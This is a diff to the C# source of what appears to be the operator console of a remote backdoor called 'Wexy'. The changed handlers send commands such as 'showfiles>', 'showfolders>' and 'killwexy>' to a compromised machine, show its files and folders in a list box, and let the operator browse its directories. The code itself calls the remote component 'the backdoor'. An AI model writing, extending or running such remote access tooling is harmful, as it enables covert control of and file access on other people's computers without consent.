@@ -192,6 +192,7 @@ namespace Wexy
             }
         }
 
+        #region Buttons events
         private void btn_openwebsite_Click(object sender, EventArgs e)
         {
             string website = txb_website.Text;
@@ -213,20 +214,41 @@ namespace Wexy
         private void btn_showfiles_Click(object sender, EventArgs e)
         {
             // I added ReceiveData() here because there is a bug when using args(instruction>args) , the data is not retrieved and is pending, so I call it again.
+            lstbox_filesfolders.Items.Clear();
+            lstbox_filesfolders.Focus();
             string dir_path = txb_directorypath.Text;
             SendCommand("showfiles>" + dir_path + ">");
             ReceiveData();
-            rtxb_files.Text = received_data;
             lbl_filefolder.Text = "Files";
+
+            string[] strings = received_data.Split('\n');
+            foreach (string item in strings)
+            {
+                lstbox_filesfolders.Items.Add(item);
+            }
         }
         private void btn_showdir_Click(object sender, EventArgs e)
         {
-            string path = txb_directorypath.Text;
-            SendCommand("showfolders>" + path + ">");
-            ReceiveData();
-            rtxb_files.Text = received_data;
-            lbl_filefolder.Text = "Folders";
-           
+            if (txb_directorypath.Text[txb_directorypath.Text.Length - 1] == '/')
+            {
+                lstbox_filesfolders.Items.Clear();
+                lstbox_filesfolders.Focus();
+                string path = txb_directorypath.Text;
+                SendCommand("showfolders>" + path + ">");
+                ReceiveData();
+                lbl_filefolder.Text = "Folders";
+
+                string[] strings = received_data.Split('\n');
+                foreach (string item in strings)
+                {
+                    lstbox_filesfolders.Items.Add(item);
+                }
+            }
+            else
+            {
+                MessageBox.Show("This is not a folder , the backdoor may crash. If it is , add a '/' at the end.");
+            }
+                  
         }
         private void btn_sendfile_Click(object sender, EventArgs e)
         {
@@ -296,7 +318,23 @@ namespace Wexy
             {
                 SendCommand("killwexy>");
                 MessageBox.Show("The backdoor stopped running on the remote machine.");
-            }               
+            }
         }
+
+        private void lstbox_filesfolders_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if(received_data.Contains("c:/"))
+            {
+                 txb_directorypath.Text = lstbox_filesfolders.SelectedItem.ToString();
+            }
+            else
+            {
+                
+                txb_directorypath.Text = txb_directorypath.Text + lstbox_filesfolders.SelectedItem.ToString();
+                int index1 = txb_directorypath.Text.IndexOf(" -");
+                txb_directorypath.Text = txb_directorypath.Text.Remove(index1);
+            }
+        }
+        #endregion
     }
 }
